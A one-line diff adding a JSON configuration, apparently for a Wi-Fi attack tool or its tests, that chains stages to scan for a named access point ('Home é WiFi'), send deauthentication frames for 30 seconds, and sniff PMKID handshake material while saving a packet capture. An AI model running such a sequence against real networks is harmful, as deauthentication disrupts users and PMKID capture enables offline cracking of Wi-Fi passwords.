@@ -1,0 +1,1 @@
+{"meta":{"savePcap":true,"enableLed":false},"stages":[{"scan":{"type":"ap","timeout":10,"channel":1}},{"select":{"type":"ap","filter":"equals \"Home \\u00e9 WiFi\""}},{"deauth":{"timeout":30}},{"sniffPmkid":{"channel":3}}]}
